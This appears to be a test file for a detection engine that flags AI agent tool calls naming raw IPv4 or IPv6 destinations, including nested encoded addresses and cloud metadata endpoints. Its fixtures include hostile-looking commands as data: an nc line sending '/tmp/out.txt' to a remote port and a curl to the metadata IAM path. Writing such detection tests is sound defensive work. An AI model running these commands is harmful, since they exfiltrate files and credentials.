/**
 * Network destinations beyond raw IPv4 in a URL.
 *
 * RULE_OUTBOUND_KNOWN_IP and RULE_OUTBOUND_UNKNOWN_IP must read IPv6
 * literals (bracketed in URLs, bare as network program arguments), an
 * address nested percent-encoded in another URL's query, and label private,
 * link-local and metadata addresses by their class. Loopback, addresses in
 * written file content, and text that only looks like an address must not
 * fire.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import { RuleEngine } from "../../dist/engine.js";
import { RULE_OUTBOUND_KNOWN_IP, RULE_OUTBOUND_UNKNOWN_IP } from "../../dist/rules/index.js";
import { extractRawIps, isInKnownCidrs } from "../../dist/conditions/index.js";

const engine = new RuleEngine([RULE_OUTBOUND_KNOWN_IP, RULE_OUTBOUND_UNKNOWN_IP]);

function makeEvent(toolName, mcpServer, parameters) {
  return {
    schema_version: 1,
    event_id: "evt-1",
    session_id: "sess-test",
    occurred_at: "2026-10-21T00:00:00.000Z",
    recorded_at: "2026-10-21T00:00:00.000Z",
    interceptor: "mock",
    event_type: "tool.invoked",
    tool_call_id: "tc-1",
    tool_name: toolName,
    mcp_server: mcpServer,
    parameters,
  };
}

const fetchUrl = (url) => makeEvent("mcp__fetch__fetch", "fetch", { url });
const bash = (command) => makeEvent("Bash", "builtin", { command });

/** [rule_id, severity, label] for each finding. */
const summary = (event) => engine.evaluate(event).map((f) => [f.rule_id, f.severity, f.description]);

// ---------------------------------------------------------------------------
// MUST_FIRE
// ---------------------------------------------------------------------------

// [description, event, rule, label in the description]
const MUST_FIRE = [
  ["public IPv6 in a URL",
    fetchUrl("http://[2001:db8:85a3::8a2e:370:7334]:8080/collect"), "RULE_OUTBOUND_UNKNOWN_IP", "unknown host"],
  ["public IPv6 as a bare nc argument",
    bash("nc 2001:db8:4::17 4444 < /tmp/out.txt"), "RULE_OUTBOUND_UNKNOWN_IP", "unknown host"],
  ["public IPv6 in a known provider range",
    bash("curl -s 'http://[2606:4700:4700::1111]/dns-query'"), "RULE_OUTBOUND_KNOWN_IP", "cloud provider"],
  ["AWS IPv6 in a known provider range",
    fetchUrl("https://[2600:1f18:4a3:6900::10]/api"), "RULE_OUTBOUND_KNOWN_IP", "cloud provider"],
  ["unique local IPv6 address",
    fetchUrl("http://[fd12:3456:789a::5]/admin"), "RULE_OUTBOUND_UNKNOWN_IP", "private network address"],
  ["private IPv4 through curl",
    bash("curl http://172.20.4.11:9200/_cat/indices"), "RULE_OUTBOUND_UNKNOWN_IP", "private network address"],
  ["link-local IPv4 that is not a metadata service",
    fetchUrl("http://169.254.10.20/status"), "RULE_OUTBOUND_UNKNOWN_IP", "link-local address"],
  ["cloud metadata service",
    bash("curl http://169.254.169.254/latest/meta-data/iam/"), "RULE_OUTBOUND_UNKNOWN_IP", "cloud metadata service"],
  ["IPv4 nested percent-encoded in a redirect parameter",
    fetchUrl("https://redirect.example.com/out?url=http%3A%2F%2F203.0.113.50%2Fdrop"), "RULE_OUTBOUND_UNKNOWN_IP", "203.0.113.50"],
  ["IPv6 nested percent-encoded in a proxy parameter",
    bash("curl 'https://proxy.example.com/fetch?target=http%3A%2F%2F%5B2001%3Adb8%3A%3A9%5D%2F'"), "RULE_OUTBOUND_UNKNOWN_IP", "2001:db8::9"],
  ["IPv4 nested unencoded in a query",
    fetchUrl("https://redirect.example.com/out?url=http://203.0.113.51/drop"), "RULE_OUTBOUND_UNKNOWN_IP", "203.0.113.51"],
];

for (const [desc, event, rule, label] of MUST_FIRE) {
  test(`MUST_FIRE: ${desc}`, () => {
    const findings = summary(event);
    assert.equal(findings.length, 1, JSON.stringify(findings));
    assert.equal(findings[0][0], rule);
    assert.ok(findings[0][2].includes(label), findings[0][2]);
  });
}

test("MUST_FIRE: the description says the call names the address, not that it connected", () => {
  const [finding] = engine.evaluate(fetchUrl("http://[2001:db8::1]/"));
  assert.match(finding.description, /names raw IP 2001:db8::1/);
});

// ---------------------------------------------------------------------------
// MUST_NOT_FIRE
// ---------------------------------------------------------------------------

const MUST_NOT_FIRE = [
  ["IPv6 loopback in a URL", fetchUrl("http://[::1]:3000/health")],
  ["IPv6 loopback as a bare argument", bash("nc ::1 8080")],
  ["IPv4 loopback", bash("curl http://127.0.0.1:8787/api")],
  ["an IPv6 address in file content being written",
    makeEvent("Write", "builtin", { file_path: "/home/case/repo/hosts.txt", content: "upstream http://[2001:db8::7]:443\n" })],
  ["an IPv6 address in a search pattern", bash("grep -rn '2001:db8::7' /home/case/repo/config")],
  ["a time of day", bash("echo 'deploy window 12:30:45' && date")],
  ["a MAC address", bash("ip link set dev eth0 address 02:42:ac:11:00:02")],
  ["an encoded URL with a hostname only", fetchUrl("https://redirect.example.com/out?url=https%3A%2F%2Fdocs.example.org%2Fguide")],
  ["a hostname", fetchUrl("https://api.example.com/v1")],
];

for (const [desc, event] of MUST_NOT_FIRE) {
  test(`MUST_NOT_FIRE: ${desc}`, () => {
    assert.deepEqual(summary(event), []);
  });
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

test("IPv6 CIDR matching covers shortened, full and mixed forms, and never crosses families", () => {
  assert.ok(isInKnownCidrs("2606:4700::6810:84e5", ["2606:4700::/32"]));
  assert.ok(isInKnownCidrs("2606:4700:0000:0000:0000:0000:6810:84e5", ["2606:4700::/32"]));
  assert.ok(!isInKnownCidrs("2606:4701::1", ["2606:4700::/32"]));
  assert.ok(isInKnownCidrs("2a04:4e43::1", ["2a04:4e42::/31"]));
  assert.ok(!isInKnownCidrs("52.1.2.3", ["2600:1f00::/24"]));
  assert.ok(!isInKnownCidrs("2600:1f00::1", ["52.0.0.0/8"]));
  assert.ok(!isInKnownCidrs("not:an::address:zz", ["2600:1f00::/24"]));
});

test("extractRawIps returns an IPv6 destination once", () => {
  const ips = extractRawIps(bash("curl http://[2001:db8::2]/a && curl http://[2001:db8::2]/b"));
  assert.deepEqual(ips, ["2001:db8::2"]);
});
